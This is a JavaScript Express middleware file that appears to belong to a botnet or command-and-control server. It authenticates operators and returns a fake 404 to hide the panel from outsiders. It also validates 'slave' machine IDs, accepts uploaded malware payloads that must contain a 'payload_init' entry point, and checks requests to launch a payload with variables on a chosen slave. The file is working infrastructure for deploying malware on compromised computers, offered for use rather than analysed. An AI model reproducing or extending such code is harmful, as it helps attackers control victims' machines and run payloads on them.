
const MALWARE_INIT = "extern \"C\" int payload_init()"
const authHelper = require("../helpers/AuthenticationHelper")

const hasAuthToken = (req, res, next) => {    

    // Check if server has authentication.
    if (!serverOptions.useAuthentication) {
        next();
        return;
    }
    
    // Check if client has API token.
    if (req.headers["authorization"]) {

        if (authHelper.checkAuthToken(req.headers["authorization"])) {
            next();
            return;
        }
    }

    res.status(404).json({message: "Page not found!"});
}

const checkNickName = (req, res, next) => {

    if (req.body && req.body.nickname && req.body.slaveId) {

        if (!databaseHelper.getSlaveById(req.body.slaveId)) {

            res.status(404).json({message: "Invalid slave ID!"});
            return;
        }

        // SQL query check?
        //...

        next();
        return;
    }

    res.status(400).json({message: "Invalid request!"});
}

const checkNewPayload = (req, res, next) => {
    
    // Check body.
    const payload = JSON.parse(req.body.payload);
    if (payload && payload.name && payload.description 
            && payload.os && payload.categories ) {
            
        // Check if file is valid.
        if (req.files && req.files.payloadFile) {

            // Check if valid source code.
            const sourceCode = req.files.payloadFile.data.toString();
            if (sourceCode.includes(MALWARE_INIT)) {
                
                // Check if variables exists in code.
                const vars = payload.variables;
                if (vars) {
                    for (var v of vars) {

                        if (!v.description) {
                            res.status(400).json({message: "No description of variable given!"});
                            return;
                        }
                        
                        if (!v.vartype || (v.vartype != "string" && v.vartype != "number")) {
                            res.status(400).json({message: "No correct variable type given!"});
                            return;
                        }
    
                        if (!sourceCode.includes(v.varname)) {
                            res.status(400).json({message: "Given variables doesn't exists in payload code!"})    
                            return;
                        }

                    }
                }
                
                next();
                return;
            }

            res.status(400).json({message: "No malware entry inside payload code!"})
            return;
        }

        res.status(400).json({message: "No payload file given!"});
        return;
    }

    res.status(400).json({message: "Invalid body!"});
}

const checkLaunchingPayload = (req, res, next) => {

    const payload = req.body;
    
    if (payload.payloadId && payload.slaveId) {

        // Check of payload exists.
        const selectedPayload = databaseHelper.getPayloadById(payload.payloadId);
        if (!selectedPayload) {

            res.status(400).json({message: "Payload doesn't exists!"});
            return;
        }

        // Check if payload has variables.
        if (payload.variables) {

            let names = payload.variables.map(v => v.name);     
            let values = payload.variables.map(v => v.value);      
            if (names.length != values.length) {
                res.status(400).json({message: "Missing variables to set!"})
                return;
            }
            
            let checkFailed = false;
            selectedPayload.variables.forEach((v) => {
                if (!names.includes(v.varname)) {
                    res.status(400).json({message: "Invalid variable '" + v.varname + "' set!"});
                    checkFailed = true;
                    return;
                }
            })

            if (checkFailed)
                return;
        }

        next();
        return;
    }

    res.status(400).json({message: "Invalid body!"});
}

const checkPayloadExists = (req, res, next) => {

    // Add code that checks if payload exists.
    next();
}

module.exports = {
    hasAuthToken,
    checkNickName,
    checkNewPayload,
    checkPayloadExists,
    checkLaunchingPayload
}